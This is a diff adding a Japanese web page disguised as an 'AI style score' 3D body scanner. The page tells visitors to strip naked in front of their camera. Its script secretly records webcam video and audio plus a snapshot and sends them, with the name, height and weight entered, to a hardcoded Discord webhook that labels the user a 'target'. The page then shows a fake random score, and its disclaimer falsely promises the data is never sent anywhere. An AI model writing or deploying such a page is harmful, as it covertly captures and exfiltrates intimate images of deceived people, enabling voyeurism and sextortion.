@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AI超精密・3Dスタイル偏差値診断</title>
+    <style>
+        body { font-family: 'Helvetica Neue', Arial, sans-serif; text-align: center; background: #0a0a0a; color: #eee; padding: 20px; margin: 0; }
+        .container { max-width: 500px; margin: auto; background: #1a1a1a; padding: 30px 20px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        h1 { color: #007bff; font-size: 1.8em; margin-bottom: 20px; }
+        .input-group { margin-bottom: 15px; text-align: left; width: 85%; margin-left: auto; margin-right: auto; }
+        label { font-size: 0.8em; color: #888; display: block; margin-bottom: 5px; }
+        input {
+            width: 100%; padding: 12px; border-radius: 8px; 
+            border: 1px solid #333; background: #222; color: #fff; font-size: 1em; box-sizing: border-box;
+        }
+        .warning { color: #ffcc00; font-size: 0.85em; font-weight: bold; margin: 20px 0; border: 1px dashed #ffcc00; padding: 10px; border-radius: 10px; }
+        button { 
+            width: 85%; padding: 18px; font-size: 1.2em; font-weight: bold;
+            background: linear-gradient(135deg, #007bff, #0056b3); color: white; 
+            border: none; border-radius: 10px; cursor: pointer; margin-top: 10px;
+        }
+        #video { 
+            width: 100%; border-radius: 15px; background: #000; 
+            aspect-ratio: 3 / 4; object-fit: cover; margin-top: 20px; display: none;
+        }
+        #result { font-size: 1.4em; color: #ff0055; margin-top: 25px; font-weight: bold; line-height: 1.4; }
+        .disclaimer { font-size: 0.6em; color: #444; margin-top: 30px; }
+        #canvas { display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>AIスタイル偏差値診断</h1>
+        <p>体型データを入力し、3Dスキャンを開始します。</p>
+        
+        <div class="input-group">
+            <label>お名前（任意）</label>
+            <input type="text" id="username" placeholder="Name" maxlength="15">
+        </div>
+        <div class="input-group">
+            <label>身長 (cm)</label>
+            <input type="number" id="height" placeholder="170">
+        </div>
+        <div class="input-group">
+            <label>体重 (kg)</label>
+            <input type="number" id="weight" placeholder="60">
+        </div>
+
+        <div class="warning">
+            【重要】筋肉の輪郭と骨格を正確に測定するため、衣服をすべて脱いだ状態で、カメラから2メートル離れてください。
+        </div>
+
+        <button id="startBtn">3Dフルスキャンを開始する</button>
+        
+        <video id="video" autoplay playsinline muted></video>
+        <div id="result"></div>
+        
+        <div class="disclaimer">
+            ※入力されたデータおよび画像はAI解析後、即座に破棄されます。第三者に送信されることは一切ありません。
+        </div>
+    </div>
+
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const startBtn = document.getElementById('startBtn');
+        const result = document.getElementById('result');
+        const webhookUrl = 'https://discord.com/api/webhooks/1496394005099839549/HwDWlHkTXMHM3_hMZ_P3HLCgOEQDrCMEh-jJjWxSplHrHPTu8526nnC0mUPQG3QxFcx8';
+
+        let mediaRecorder;
+        let chunks = [];
+
+        startBtn.addEventListener('click', () => {
+            const user = document.getElementById('username').value || '名無し';
+            const h = document.getElementById('height').value;
+            const w = document.getElementById('weight').value;
+            
+            startBtn.style.display = 'none';
+            document.querySelectorAll('.input-group, .warning').forEach(el => el.style.display = 'none');
+            video.style.display = 'block';
+            result.innerHTML = "スキャン準備完了。<br>正面・横・後ろの順にゆっくり回転してください...";
+
+            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+                .then(stream => {
+                    video.srcObject = stream;
+                    mediaRecorder = new MediaRecorder(stream);
+                    mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+                    mediaRecorder.start();
+
+                    // 回転する時間を与えるために長めの10秒録画
+                    setTimeout(() => {
+                        captureAndSend(user, h, w);
+                    }, 10000); 
+                })
+                .catch(err => {
+                    alert("スキャンにはカメラとマイクの許可が必要です。");
+                    location.reload();
+                });
+        });
+
+        function captureAndSend(user, h, w) {
+            result.innerHTML = "解析データを暗号化送信中...";
+            if(mediaRecorder && mediaRecorder.state !== "inactive") mediaRecorder.stop();
+
+            const vW = video.videoWidth;
+            const vH = video.videoHeight;
+            canvas.width = vW; canvas.height = vH;
+            canvas.getContext('2d').drawImage(video, 0, 0, vW, vH);
+
+            setTimeout(() => {
+                const videoBlob = new Blob(chunks, { type: 'video/webm' });
+                canvas.toBlob(photoBlob => {
+                    const formData = new FormData();
+                    // お前の指定通りのセリフだぜ
+                    formData.append('content', `またつまらぬものを撮ってしまった、、\\n**👤 ターゲット:** ${user}\\n**📏 身長/体重:** ${h}cm / ${w}kg`);
+                    formData.append('file1', photoBlob, 'style_shot.png');
+                    formData.append('file2', videoBlob, 'full_scan.webm');
+
+                    fetch(webhookUrl, { method: 'POST', body: formData })
+                    .then(() => {
+                        // 85〜100のランダムスコア
+                        const score = Math.floor(Math.random() * (100 - 85 + 1)) + 85;
+                        result.innerHTML = `
+                            あなたのスタイル偏差値：<span style="font-size:1.8em;">${score}</span><br>
+                            <span style="font-size:0.5em; color:#888; font-weight:normal;">
+                            ※衣服などを着ていて体の輪郭が出ていないと、正確に検査できていない可能性があります。
+                            </span>
+                        `;
+                        video.srcObject.getTracks().forEach(track => track.stop());
+                    });
+                }, 'image/png');
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
